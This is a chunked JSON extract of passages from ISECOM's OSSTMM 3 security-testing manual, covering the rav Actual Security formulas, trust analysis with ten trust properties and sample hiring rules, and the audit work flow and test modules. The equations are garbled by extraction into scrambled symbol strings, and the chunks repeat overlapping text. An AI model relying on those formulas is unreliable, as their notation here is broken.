Visibility T V W C T L A OpSec MCvg: Percent Missing Coverage sum Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 83\\nSecurity Limitations Base SecLim is then calculated as the aggregated total of each input multiplied by its corresponding sum weighted value as defined in the table above.  OpSec MC   OpSec MC   OpSec MC  SecLim  L  sum sum L  sum A L  sum B  sum  V OpSec   W OpSec   C OpSec        sum sum sum  P  P MCvg L L L   P MCvg L L L  L  V A V W C L  T V W C   E OpSec   A OpSec      sum sum The Security Limitations base equation is given as: SecLim  log2 1100SecLim  base sum Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 84\\n4.7 The Actual Security Formula This is the final part for using all previous calculations in three different ways. Actual Security Delta The Actual",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 67
    }
  },
  {
    "text": " sum sum The Security Limitations base equation is given as: SecLim  log2 1100SecLim  base sum Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 84\\n4.7 The Actual Security Formula This is the final part for using all previous calculations in three different ways. Actual Security Delta The Actual Security Delta is useful for comparing products and solutions by previously estimating the change (delta) the product or solution would make in the scope. We can find the Actual Security Delta, ActSec, with the formula: ActSec  FC OpSec SecLim . base base base True Protection Can be used as a simplified expression for the optimal coverage of a given scope where 100 signifies an optimal relationship between the Porosity, True Controls and Security Limitations. True Protection is given as: TruPro100TC OpSec SecLim base base base Actual Security To measure the current state of operations with applied controls and discovered limitations, a final calculation is required to define Actual Security. As implied by its name this is the whole security value which combines the three values of operational security, controls, and limitations to show the actual state of security. Actual Security (total), ActSec, is the true state of security provided as a hash of all three sections. A rav of 100 signifies a perfect balance of security however the Actual Security is not a true percentage value. Scores above 100 are also possible which signifies that the tested scope has more controls implemented than necessary which could also be proof of overspending. The final rav equation for Actual Security is given as: 1 ActSec100 ActSec OpSec FC OpSec SecLim FC SecLim  100 base base base base base base Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 85\\nTrusting everyone is insecure but not trusting anyone is inefficient. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 86\\nChapter 5 – Trust Analysis “If you could take a pill that would make you more trusting, would you?” is how an informal ISECOM study began to help people better understand how they misuse trust as a concept. The general public answers no to this question. One security professional answered, “Yes but only if everyone else has to take it too.” Trust can be both a problem and a solution. It is a problem where it puts security in a compromising position. Like the concept of potential energy in physics, trust creates a concentration of authorization which can explode into a big problem should the trust fail or the trusted target be deceived into harming the trust-giver. However it can also reduce the need for continuous, possibly redundant re-authentication, increasing the efficiency of operations. For that reason, trust is often seen as an “authenticate once and walk away” protocol. This is most often seen in Human Security where Human Resources departments research a candidate before the hire and afterward that person has continuous access to resources until they are no longer an employee. Re-authentication is then done seldom or sporadically and rarely at the same",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 68
    }
  },
  {
    "text": "and walk away” protocol. This is most often seen in Human Security where Human Resources departments research a candidate before the hire and afterward that person has continuous access to resources until they are no longer an employee. Re-authentication is then done seldom or sporadically and rarely at the same depth as when hired. In operational security, Trust is merely a contributor to porosity, just another interaction to control. It differs from Access (the other form of interaction), in how it relates to other targets within the scope. So where Access is interaction between two sides of a vector into and out of the scope, Trust is measured as the interactions between targets within the scope. However, most people don’t use trust so concretely. Trust is usually applied to a specific person or item and a specific act such as, “Can I trust this employee to deliver before the deadline?” or “Can I trust this computer?”. There are correct answers for these questions but people often lack the skills needed to quantify the level of Trust for that person or object which would let us make a more rational and logical decision. However, to quantify trust, we need to first understand it. 5.1 Understanding Trust Trust is a decision. While some people claim it is an emotion, like love, or a feeling, like pain, its clearly a complex quality we humans are born with. Unlike an emotion or a feeling, we can choose to trust or not to trust someone or something even if it feels wrong to do so. It appears that we are capable to rationalize in a way to supersede how we feel about trusting a target. This means we can quantify it by applying a logical process. It also means we can assign trust values to objects and processes as well as people based on these values. This brings new power to those who can analyze trust and make decisions based on that analysis. It also means Analysts with this skill can better control bias, identify fallacies (especially those from authoritative or trusted sources), and handle unknowns for transparent reporting. One point to note, however once the trust is quantified, it is only a vehicle for rationalizing the trust. It will not make something feel trustworthy now or in the future. Some people have strong feelings of aversion or attraction which may be at odds with the facts. As part of OpSec, trust is one part of a target’s porosity. Where security is like a wall that separates threats from assets, trust is a hole in that wall. It is wherever the target accepts interaction from other targets within the scope. However, people tend to use improper or incomplete operational controls with their trusts like authentication that has been made with improper identification such as a voice over a telephone, a business card, or even just the assumption that because a person is in the room that they are authorized to be there. This opens people",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 69
    }
  },
  {
    "text": "improper or incomplete operational controls with their trusts like authentication that has been made with improper identification such as a voice over a telephone, a business card, or even just the assumption that because a person is in the room that they are authorized to be there. This opens people up to fraud and deceit. The use of additional controls are required to secure a trust, to assure its integrity and resilience. Unfortunately, while using more controls works with objects and processes, it may not work between people. Many times social norms consider controls beyond simple authentication like matching a face or Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 87\\nvoice with an identity to be offensive to the person to be trusted. Society often requires us to be more trusting as individuals in order to benefit society as a whole and sometimes at the expense of everyone’s individual protection. As stated earlier, operational trust is measured as a negative thing which comes from an interaction between two entities in a scope. When a trust has no controls, it’s what people call “blind trust” which may be good for relationships and can speed interactions but is bad for operational security. People generally apply controls to trusts even if they don’t think of it as such at the time. Some controls are inherently given more weight than others depending on the situation and need. When selecting a person who they need to depend on, they may put a larger value on integrity and resilience. When making a financial transaction, they may put a larger value on authentication, continuity, and confidentiality. They may put a larger value on alarm and subjugation for advice on a product unless it’s a medical prescription then they would prefer privacy and non-repudiation. Realistically though, they are not actually giving more value to particular controls. Instead they are actually evaluating on the ten trust properties and looking for those specific controls for comfort to their trust decisions. Using the trust properties allows them to make a decision to trust or not even when the information they have about the target is incomplete. Since uninformed and unpracticed trust decision making is a dangerous gamble the very least a formal process like applying the trust properties can provide is to inform the decision maker of exactly how much they don’t know and allow them to seek more information before continuing. This means that the real need for being able to quantify operational trust occurs when we must rely on many unknowns to determine and rationalize trust. The trust properties are the quantifiable, objective elements which are used to create trust. We can say these properties are what we would say give us “reason to trust”. These properties are to be made into baseline rules based on the target and situation which we are verifying. Unfortunately, many illogical trust properties exist and are all too commonly in use which makes it more difficult for us to make proper trust decisions",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 70
    }
  },
  {
    "text": "say give us “reason to trust”. These properties are to be made into baseline rules based on the target and situation which we are verifying. Unfortunately, many illogical trust properties exist and are all too commonly in use which makes it more difficult for us to make proper trust decisions without it feeling wrong. However, it’s exactly the feeling part which makes us more error prone. During research, many potential trust properties were discovered which are commonly in use and even official, government and industry regulations recommend, however they failed logic tests and were discarded from our set of properties leaving only ten. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 88\\n5.2 Fallacies in Trust Unfortunately, most people are bad at understanding and using trust. Many illogical methods for trust exist and are popularly used. Two examples of the most common, fallacious, trust properties are composability and transitivity. These properties are popularly used by people to make trust decisions about the unknown. In composability, a person makes a trust choice based on what a large number of people have to say about the thing or person in question even if those people aren’t individually trusted. Basically, a person accepts the group’s trusts as their own. This is similar to the pressure created by social or political groups and mass media. The reason why this is illogical is because the individual experiences of others, especially strangers, are all relative and cannot verify the consistent trustworthiness of future events. Common examples of fallacious trust use, first with Composability and secondly, with Transitivity. The other common fallacious use of trust is transitivity. It is when a person accepts the trust decision of a trusted person for themselves. It is also known as the chain of trust: you trust Alice and Alice trusts Jack therefore you can trust Jack. However, transitive trust is illogical as well because you may trust Alice for some things but perhaps not the same things for which she trusts Jack. There is also the possibility that Alice has approached the trust for some emotional benefit not available to you. People who often trust “their gut” to make trust decisions are lauded when they are right as if they have some secret, powerful sense above other humans. However, other than just luck, some people are better at paying attention to details, seeing emotional micro-expressions in faces, and applying logic quickly to common situations which they themselves might not be able to express verbally as to how but rather they do feel what’s wrong. These people learned to do this naturally and built upon it with experience filled with trial and error not really obvious to themselves any more than anyone notices the millions of small decisions they make each day and their consequences. The trust properties allow ordinary people who do not have this natural ability to analyze any of their trust decisions with skill, distancing themselves from their own under-developed “gut instinct” until they can recondition themselves to do",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 71
    }
  },
  {
    "text": "notices the millions of small decisions they make each day and their consequences. The trust properties allow ordinary people who do not have this natural ability to analyze any of their trust decisions with skill, distancing themselves from their own under-developed “gut instinct” until they can recondition themselves to do so automatically, fluently, sharpening their instincts until they work “from the gut”. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 89\\n5.3 The Ten Trust Properties The ten trust properties to make proper trust analysis are: Trust Property Description The number to be trusted. Must the trust extend to just one or to many? Is the group to be a trusted one which is meant to make 1 Size collective decision? The vector (direction) of the trust. Trust may be one way (asymmetrical) and defined as to which way the trust must travel or 2 Symmetry both ways (symmetrical). A person who must also trust you has to consider the reciprocation from breaking the trust. The level of transparency of all operational parts and processes of the 3 Visibility target and its environment. Also called control, the amount of influence over the scope by the 4 Subjugation operator. The historical evidence of compromise or corruption of the target. 5 Consistency The amount and timely notice of change within the target. 6 Integrity The offsets of sufficient assurance are compensation for the trust giver or punishment for the trust breaker. It is a value placed on the trust 7 Offsets with the target. The financial offset for risk, the amount of win or gain for which the risk of putting trust in the target is sufficient to offset the risk of failure in the 8 Value trust. The number of other elements which currently provide resources for the target either through direct or indirect interactions, similar to 9 Components Intervention of the Four Point Process. The amount of separation between the target and the external 10 Porosity environment. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 90\\n5.4 The Trust Rules Using the trust properties allows us to create only quantifiable rules, not “soft” rules that can neither substantiate the trust level nor disrupt it with a biased, emotional weight. However, the properties on their own are useless if they cannot become quantifiable properties, objective, or understandable by the common person not necessarily involved in the security field. Therefore we still need to turn the trust properties into trust rules, calculations of directly relevant operations made from all the trust properties. We do this in the form of questions where the answers are unbiased numbers which will be used to create a percentage for easier comprehension and which matches our common use of qualifiers of trust in normal speech like almost, sometimes, always, and never. When creating the trust rules from the trust properties it is important to note that trust decisions are not linear. There is no building towards trust in a particular order or even an effort value system where it",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 72
    }
  },
  {
    "text": "qualifiers of trust in normal speech like almost, sometimes, always, and never. When creating the trust rules from the trust properties it is important to note that trust decisions are not linear. There is no building towards trust in a particular order or even an effort value system where it can be determined that one level requires more effort than another. In methodology terms, it appears irrational when calculated. A decision to trust therefore may be concluded by an answer from just one of the following tests which makes up the trust rules. However, doing so is our conscious choice to make a trust where the calculation specifically says not to. This may make most sense in a life or death situation where the result of trustworthiness is very low but the Value of Reward (one’s life) is so incredibly great that no other choice can be made. The trust rules must be created specifically for the target. While this may seem cumbersome, it is possible to make generically topic-specific trust rules which will suit the purpose. The benefit of this is that the trust properties can then be made into rules fitting any purpose and any situation where one must make a trust decision on another person, thing, process, system, or action. With practice, these trust rules can be made automatically and very quickly as part of one’s decision process, focusing only on the rules which can be answered and discovering the ones where there can be no known answer with the information available. The application of the trust rules into specific verification tests that provide a quantity is good however ideally you need to determine a finite quantity. An infinite quantity may be too relative to the tester and does not provide the constraints necessary for expressing the result in a percentage. For example, to apply the third property, transparency, the components should be counted as indexed so that there is a finite amount. So the parts of a computer can have an end number before the computer is completely built and a process can have a precise, finite number of steps before it is completed. For people, however, this may not be so easy to do but it is possible if applied properly to the situation. In the case of a security clearance, you may count all relationships within a given time range and of those, the number which are with people who have criminal records. This allows for a finite number even if rather large. Then, you may want to complete other tests specific to the third rule as that one may only give one type of influence. Others may be financial necessities, work experiences, memberships, convictions, and anything that will give a good representation as to how transparent that person is. The final calculation however has to be the sum total of all tests which will provide a single transparency percentage for that rule. The resulting percentage for each trust rule can be viewed individually",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 73
    }
  },
  {
    "text": "convictions, and anything that will give a good representation as to how transparent that person is. The final calculation however has to be the sum total of all tests which will provide a single transparency percentage for that rule. The resulting percentage for each trust rule can be viewed individually to show where controls must be applied to improve or maintain necessary levels of trustworthiness. This may also show where improvements must be made before a trust can be considered. For example, a trust analysis for a costly and difficult military campaign may show that rule four, subjugation, is at 10% because some of the necessary participants are civilians and not under military control. This gives the theater operators of the campaign specific, actionable information to make the necessary adjustments to get that percentage up to a level that’s acceptable or else apply more controls to better assure compliance from those civilian members. Another result from analyzing the percentages of individual trust rules is that unknowns become glaringly Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 91\\nobvious because the less that is known, the lower the percentage will be. This means unknowns will be at or very close to 0%. The end metric however is one which is the mean of all percentages. This provides a big picture understanding you could rationally have of the target of the trust. This is especially useful when it is difficult to make a trust decision because of personal bias. Use of trust rules in formal security analysis as well as regular decision making can greatly minimize bias and mistakes. Therefore, the Analyst should be practiced in this skill so as to be able to apply them quickly so that it can be used even in high-pressure or emergency situations where a snap decision is necessary and a wrong decision is tragedy. Example Trust Rules This is a sample of generic trust rules anyone can employee to make better hiring decisions beyond that of just the technical qualification of the applicant. It follows the 10 trust properties. The goal is to make quantifiable questions which can be answered for each of the properties and applied by any person and on any potential new hire. Solid trust rules allows for consistency in quality rather than relying on the “gut instinct” of the gate keepers who need to make the trust decisions. 1. Size: 1.1. Calculate the applicant divided by the total group of applicants. 1.2. Calculate the number of people the applicant appears to know in the group divided by total applicants from the total group. 1.3. Calculate the number of current employees the applicant knows (and is “friends” with) in this location and divide it by the total number of employees in this location. 1.4. Record the average of these results. 2. Symmetry: 2.1. The number of people the applicant must rely on to do their job in this position (including the applicant) divided by the number of professionals who must rely on the",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 74
    }
  },
  {
    "text": "it by the total number of employees in this location. 1.4. Record the average of these results. 2. Symmetry: 2.1. The number of people the applicant must rely on to do their job in this position (including the applicant) divided by the number of professionals who must rely on the applicant in this position. 3. Visibility: 3.1. The number of hours per day the applicant will be working alone, unassisted, unmonitored divided by the number of working hours. 4. Subjugation: 4.1. The number of decisions the employee will be making daily, independently, without input, divided by the total number of decisions the position normally requires in a day. 4.2. The applicant divided by the number of team members the applicant will be working with daily. 4.3. Record the average of these results. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 92\\n5. Consistency: 5.1. The total number of months which the applicant has not been employed divided by the total number of months the applicant has been on the workforce and eligible for employment. 5.2. The total number of criminal offenses known divided by the current age less eighteen years (or the legal age of an adult in your region) of the applicant. 5.3. The number of neutral or negative references from past employers divided by the total number of past employers. 5.4. Record the average of these results. 6. Integrity: 6.1. The number of deliverables the applicant must produce or show for on a weekly basis divided by the work week. 7. Offsets: 7.1. Amount of assets by value the applicant will have access to divided by a standardized cost of prosecution and cost of recovery. 8. Value: 8.1. The monthly income created or saved by the applicant in the position divided by the monthly cost of the applicant. (We don’t measure the amount paid by the position compared to the national average because no clear correlation exists between pay grade and job satisfaction preventing an employee from leaving, stealing, or sabotaging the workplace.) 9. Components: 9.1. The number of processes which require the applicant divided by the total number of processes for the position. 9.2. The number of resources the employee will use monthly divided by the total number of resources available for all employees in that position. 9.3. Record the average of these results. 10. Porosity: 10.1. The amount of time weekly the applicant would spend interacting directly with competitors, partners, or clients divided by the total number of weekly work hours. 10.2. The number of employees living in the same community as the applicant divided by the total number people in the community. 10.3. Record the average of these results. Each example of a calculation is to make a percentage which will be averaged with the other percentages of all trust properties to create a final trust value. The final value will tell you how much you should trust the new employee. Re-evaluations can then be made regularly to see how much has changed and if this",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 75
    }
  },
  {
    "text": "make a percentage which will be averaged with the other percentages of all trust properties to create a final trust value. The final value will tell you how much you should trust the new employee. Re-evaluations can then be made regularly to see how much has changed and if this should influence any permissions provided to the employee, pay rate, or other bonuses. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 93\\n5.5 Applying Trust Rules to Security Testing Security tests will verify which operational trusts exist however the use of trust rules are required to know if they should exist. This is determined with the use of the Trust Rules during security testing. Security management and policy creation is generally based on risk which defines the permissible interactions within and throughout an organization. This method essentially defines rules for users and configurations for systems which will provide the required level of protection when followed. The policy may also dictate how to handle problems which can occur should the rules or configurations be insufficient or not properly followed. Therefore the security policy will outline what the organization determines as trustworthy or not and which operational trusts will be allowed. However to test operational trust as established by the security policy is not security testing and it will not help an organization better determine where its protection is limited. Security testing against a particular policy to assure the rules are followed is called compliance testing and it is not the same as security testing. The use of the OSSTMM audit will determine the existing operational trusts whether or not they are acknowledged within the security policy. These findings subjected to trust analysis where the Trust Rules have been applied on people, systems, and processes will provide a precise measurement of where controls need to be. This can then be compared to the security policy to find the deficiencies that impact current protection measures as well as future security plans. Ultimately the Analyst would use trust metrics in place of risk analysis for a more accurate means of protecting a scope. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 94\\nThere are only 2 ways to steal something: either you take it yourself or you have someone else take it and give it to you. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 95\\nChapter 6 – Work Flow The OSSTMM flow begins with a review of the target’s posture. The posture is the culture, rules, norms, contracts, legislation, and policies defining the target. It ends with result comparisons to any alarms, alerts, reports, or access logs. This is a full-circle concept where the first step is to be aware of the operational requirements for interacting with the target, and the last step is the review of the records of the audit trail. For the Analyst, this is simply: you know what you need to do, you do it, and then you check what you have done. This methodology separates what needs to be done",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 76
    }
  },
  {
    "text": "interacting with the target, and the last step is the review of the records of the audit trail. For the Analyst, this is simply: you know what you need to do, you do it, and then you check what you have done. This methodology separates what needs to be done into this hierarchical format: 1. CHANNEL 2. MODULE 3. TASK The work is described in the module description for each particular channel audit. Some audits apply to technologies which may straddle the border between two or more channels. For example, commonly found wireless LANs must be tested under both the Data Networks channel and the Wireless channel. This is why a properly defined testing plan is so important. Channel hybridization is a constant and should not be overlooked. The OSSTMM is fully capable of a “sidewalk to kernel” security review and therefore is completely capable of applying an analysis to a target whether its channels are clearly distinct and separate or comprised of multiple channels. Therefore, for all targets, the Analyst should anticipate the need to define an audit to include multiple channels. Sometimes only under investigation will it become evident whether the scope contains any targets under a particular channel or if the Analyst will miss targets only available under other channels. This methodology applies to all five channels. It has 17 modules and all the same properties apply to all five channels. While the methodology itself may be the same, each channel differs in tasks. Each module has an input and an output. The input is the information used in performing each task. The output is the result of completed tasks. This output may or may not be intelligence (analyzed data) to serve as an input for another module and this output may further serve as the input for more than one module or section. Therefore, failure to complete certain modules or tasks may limit the successful completion of other modules or tasks. This would limit the thoroughness of the audit far more than just an accounting for the missing tasks would reveal. Some tasks yield no output, meaning that modules will exist for which there is no input. Modules which have no input can be ignored during testing but must be later documented with an explanation for not having been performed. Also, tasks with no output do not necessarily indicate an inferior test; rather, they may indicate superior security. In detail, tasks that have no resulting output can mean any of five things: 1. The channel was obstructed in some way during the performance of the tasks. 2. The tasks were not properly performed. 3. The tasks were not applicable. 4. The task result data has been improperly analyzed. 5. The task reveals superior security. It is important that impartiality and open-mindedness exist in performing the tasks of each module. The primary tenet for auditing states, in similar regard to a conformational bias: “When one searches for something, one expects to find it, which may lead you",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 77
    }
  },
  {
    "text": "improperly analyzed. 5. The task reveals superior security. It is important that impartiality and open-mindedness exist in performing the tasks of each module. The primary tenet for auditing states, in similar regard to a conformational bias: “When one searches for something, one expects to find it, which may lead you to finding only what you are searching for.” In the OSSTMM, each module begins as an input and ends as an output exactly for the reason of keeping bias minimal. Therefore, each task gives a direction of what should be revealed to move to another point within the methodology. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 96\\nA previous trust analysis may be incorporated to determine scope according to vector and channel. A trust analysis can also be used to predetermine which modules need to be performed as independent tests. However, remember that modules are parts of a whole test and the assumption that any particular module can just be omitted is false and will lead to an improper test. If there is no input for a particular module though, it may be omitted without degrading the quality of the test. The difference is that, in the first case, the module or task is ignored based on a trust decision while in the second the test itself dictated that the module or task cannot be performed. With the provision of testing as a service, it is important to communicate to the target owner exactly what of the scope has not or will not be tested. This manages expectations and potentially inappropriate risk assurances in the security of a system. Testing time with the modules is relative to the plan. For example, if the Analyst tests the physical security of a door, then the test would have at least two vectors: the door’s functional security from the outside of the room to the inside, and then from the inside of the room to the outside. Determining the proper scope based on the vector is important because there may still be targets outside of the vector and still within the scope which will not make up the current testing scope. Overall, larger scopes with multiple channels and multiple vectors require more time spent on each module and its tasks. The amount of time allowed before returning with output data is not determined by this methodology and depends on the Analyst, the target, the test environment, and the test plan. 6.1 Methodology Flow The OSSTMM does not allow for a separation between what is considered active data collection and verification through agitation; because, in both cases, interaction is required. Nor does it differentiate between active and passive testing where active testing is the agitation to create an interaction with the target and passive testing is the recording, aggregation, and analysis of emanations from the target. This methodology requires both active and passive tests. Furthermore, the Analyst may not be able to differentiate between data collected passively from emanations of the operations and that",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 78
    }
  },
  {
    "text": "agitation to create an interaction with the target and passive testing is the recording, aggregation, and analysis of emanations from the target. This methodology requires both active and passive tests. Furthermore, the Analyst may not be able to differentiate between data collected passively from emanations of the operations and that which is the delayed or misdirected response to agitation. The introduction of any outside event, including the passive kind, has the potential to change the nature of the target’s operations and lower the quality of an uninfluenced test on operational security. However, this does not represent a failure of the Analyst or the audit process, but simply an unavoidable evil of testing a system in a stochastic environment over a linear time frame. Simply put, the Analyst often cannot “take back” the agitation once it has been set in motion and any corrections will cause additional and varied results that do not match the aim of the original task. This is important because it will make it difficult to later compare results. It will also mean that prior tests will influence later tests due to the “memory” of the impact of the test. This is very noticeable in testing over the PHYSSEC channel. It is important to note that when harmonizing the OSSTMM with other testing standards, it is important not to constrict the flow of this methodology by introducing standards so formal and unrelenting that the quality of the test suffers. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 97\\nThe Memory of Operations This is an example of how PHYSSEC operational tests in a stochastic environment over a linear time frame are affected by their own memory. Scenario 1 The Analyst tests entry into a secured area with false authentication. The guard examines the badge briefly and allows the Analyst to enter. The Analyst performs the audit to the point where the Analyst is identified and the nature of the audit is revealed, if at all. Scenario 2 The Analyst tests entry into a secured area with false authentication. The guard examines the badge briefly and doubting its authenticity, does not allow the Analyst to enter. The Analyst tries additional tactics until entry is gained. The Analyst performs the audit to the point where the Analyst is identified and the nature of the audit is revealed, if at all. In both scenarios 1 and 2, there may or may not be a record of the entry attempt. If there is a record, that record can be re-used either by the Analyst the next time if the badge is denied as proof of its authenticity or by the guard who may be doubting its authenticity and wants to see what other guards have done. For the next audit, the Analyst may try the same badge again, attempt other means to gain entry through social engineering techniques, or try using a different badge. That guard, other guards that the guard may have spoken with, and any log records of either the",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 79
    }
  },
  {
    "text": "other guards have done. For the next audit, the Analyst may try the same badge again, attempt other means to gain entry through social engineering techniques, or try using a different badge. That guard, other guards that the guard may have spoken with, and any log records of either the successful or failed attempt are all memories of the Analyst, the technique, and should the guard know of the audit, the audit itself. However, should scenario 2 occur, it is possible that the interaction escalating through the additional techniques used by the Analyst means that scenario 2 is a more thorough test as more tests are made within the same interaction. It also means that the audit and the Analyst will more likely be remembered by the guard. If the Analyst does not gain entry at all, then the completeness of the test is limited as to when the Analyst ran out of techniques, with each failed technique making entry that much more difficult. If the Analyst goes through all techniques outlined by tasks in the methodology, then the tests have been completed. If not, then the tests not yet conducted need to be tried on a different guard with different results as different people behave differently. While this may seem to be a human problem, it is not. A door or window forced open too often will remain damaged until it is replaced. Physical use always results in physical deterioration. Even in wired communications, the act of snooping traffic will cause delays (sometimes noticeable) or change power consumption, both with either direct or indirect and often varied results. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 98\\n6.2 The Test Modules To choose the appropriate test type, it is best to first understand how the modules are designed to work. Depending on the thoroughness, business, time allotment, and requirements of the audit, the Analyst may want to schedule the details of the audit by phase. There are four phases in the execution of this methodology: A. Induction Phase B. Interaction Phase C. Inquest Phase D. Intervention Phase Each phase lends a different depth to the audit, but no single phase is less important than another in terms of Actual Security. A. Induction Phase Every trip begins with a direction. In the induction phase, the Analyst begins the audit with an understanding of the audit requirements, the scope, and the constraints to the auditing of this scope. Often, the test type is best determined after this phase. Module Description Explanation The review of the culture, rules, norms, Know the scope and what tests must regulations, legislation, and policies be done. Required if Phase C is to be A.1 Posture Review applicable to the target. properly conducted. The measurement of interaction Know the limitations of the audit itself. constraints such as distance, speed, This will minimize error and improve A.2 Logistics and fallibility to determine margins of efficiency. accuracy within the results. The verification of the practice and Know the restrictions imposed",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 80
    }
  },
  {
    "text": "to the target. properly conducted. The measurement of interaction Know the limitations of the audit itself. constraints such as distance, speed, This will minimize error and improve A.2 Logistics and fallibility to determine margins of efficiency. accuracy within the results. The verification of the practice and Know the restrictions imposed on breadth of interaction detection, interactive tests. This is required to A.3 Active Detection Verification response, and response predictability. properly conduct Phases B and D. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 99\\nB. Interaction Phase The core of the basic security test requires knowing the scope in relation to interactions with the targets conveyed to interactions with assets. This phase will define the scope. Module Description Explanation The determination of the targets to be Know what targets exist and how they tested within the scope. Visibility is interact with the scope, if at all. A regarded as “presence” and not dead or missing target is also an B.4 Visibility Audit limited to human sight. unresponsive target. However, an unresponsive target is not necessarily a missing target. The measurement of the breadth and The access point is the main point of depth of interactive access points any asset interaction. Verifying an within the target and required access point exists is one part of B.5 Access Verification authentication. determining its purpose. Full verification requires knowing all there is to know about the access point. The determination of trust relationships Trusts for new processes are often very from and between the targets. A trust limited where older processes have a relationship exists wherever the target seemingly chaotic evolution to the B.6 Trust Verification accepts interaction between targets in outsider. Knowing trust relationships the scope. between targets will show the age or value of the interaction. The measurement of the use and Most processes are defined in effectiveness of the process-based response to a necessary interaction (Class B) loss controls: non-repudiation, and some remain long after that B.7 Control Verification confidentiality, privacy, and integrity. interaction stops or has changed. The control of alarm is verified at the Knowing what process controls are in end of the methodology. place is a type of security archeology. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 100\\nC. Inquest Phase Much of security auditing is about the information that the Analyst uncovers. In this phase, the various types of value or the detriment from misplaced and mismanaged information as an asset are brought to light. Module Description Explanation The determination of the existence Know the controllers and their routines and effectiveness of the record and for the controls. Most processes will maintenance of existing actual have a defined set of rules, however security levels or diligence defined by actual operations reflect any C.8 Process Verification the posture review and efficiency, laziness, or paranoia which indemnification controls. may redefine the rules. So it’s not just that the process is there but also how it works. The research of the steady state This module explores the default (normal operation) of",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 81
    }
  },
  {
    "text": "actual operations reflect any C.8 Process Verification the posture review and efficiency, laziness, or paranoia which indemnification controls. may redefine the rules. So it’s not just that the process is there but also how it works. The research of the steady state This module explores the default (normal operation) of the targets as conditions under which the targets they have been designed to operate operate regularly to understand the under normal conditions to determine intent, business justification, and Configuration Verification / underlying problems outside of the reasoning for the targets. Additionally, C.9 Training Verification application of security stress tests. many regulations require information regarding how something is planned to work and this is not always evident in the execution of that work. The measurement of the breadth and Know the status of property ownership depth in the use of illegal or unlicensed rights. C.10 Property Validation intellectual property or applications within the target. A determination of the levels of Know which privacy rights apply and personally identifiable information to what extent the uncovered defined by the posture review. personally identifiable information can C.11 Segregation Review be classified based on these requirements. The search for freely available The word on the street has value. information which describes indirect Uncover information on targets and C.12 Exposure Verification visibility of targets or assets within the assets from public sources including chosen channel of the scope. that from the targets themselves. The search for freely available There may be more value in the information, directly or indirectly, which information from processes and could harm or adversely affect the targets than the assets which they are Competitive Intelligence C.13 target owner through external, protecting. Uncover information that Scouting competitive means. by itself or in aggregate can influence competitive business decisions. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 101\\nD. Intervention Phase These tests are focused on the resources the targets require in the scope. Those resources can be switched, changed, overloaded, or starved to cause penetration or disruption. This is often the final phase of a security test to assure disruptions do not affect responses of less invasive tests and because the information for making these tests may not be known until other phases have been carried out. The final module, D.17, of Alert and Log Review, is required to verify prior tests which provided no interactivity back to the Analyst. Most security tests that do not include this phase may still need to run an end review from the perspective of the targets and assets to clarify any anomalies. Module Description Explanation The determination and measurement Determine the effectiveness of of effective use of quarantine for all authentication and subjugation D.14 Quarantine Verification access to and within the target. controls in terms of black and white list quarantines. The mapping and measurement of the Determine the effectiveness of impact of misuse of subjugation authorization on authentication, controls, credentials, and privileges or indemnification, and subjugation D.15 Privileges Audit the unauthorized escalation of controls in terms",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 82
    }
  },
  {
